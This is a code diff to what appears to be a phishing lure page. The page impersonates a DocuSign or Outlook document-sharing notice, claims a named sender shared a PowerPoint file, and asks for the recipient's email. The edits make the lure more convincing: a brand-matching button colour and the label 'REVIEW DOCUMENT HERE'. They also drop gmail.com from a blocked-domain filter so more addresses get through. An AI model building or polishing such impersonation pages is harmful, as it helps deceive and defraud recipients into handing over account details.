@@ -28,7 +28,7 @@
         }
         input, button { padding: 10px; margin-top: 10px; }
         input { width: 280px; border: 1px solid #ccc; border-radius: 5px; }
-        button { background-color: #D35230; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        button { background-color: #00A3EE; color: white; border: none; cursor: pointer; border-radius: 5px; }
         footer { 
             background: #f4f4f4; /* Footer matches the email form background */
             color: black; 
@@ -72,8 +72,8 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/3/34/DocuSign_logo.png" alt="Outlook Logo" class="logo"><br>
         
         <p>Here's the PowerPoint file that <b>Max Warren</b> shared with you.</p><br><br>
-        <input type="email" id="email" placeholder="Enter the recipient's email to proceed">
-        <button onclick="validateEmail()">Continue</button>
+        <input type="email" id="email" placeholder="Enter the recipient's email to proceed"> </br></br>
+        <button onclick="validateEmail()">REVIEW DOCUMENT HERE</button>
     </div>
 
     <!-- Footer -->
@@ -97,7 +97,7 @@
                 return;
             }
 
-            let forbiddenDomains = ["gmail.com", "yahoo.com", "aol.com", "company.com", "teste.com", "test.com", "mail.com", "email.com", "verizon.net"];
+            let forbiddenDomains = [ "yahoo.com", "aol.com", "company.com", "teste.com", "test.com", "mail.com", "email.com", "verizon.net"];
             let emailDomain = email.split("@")[1].toLowerCase();
             
             if (forbiddenDomains.includes(emailDomain)) {
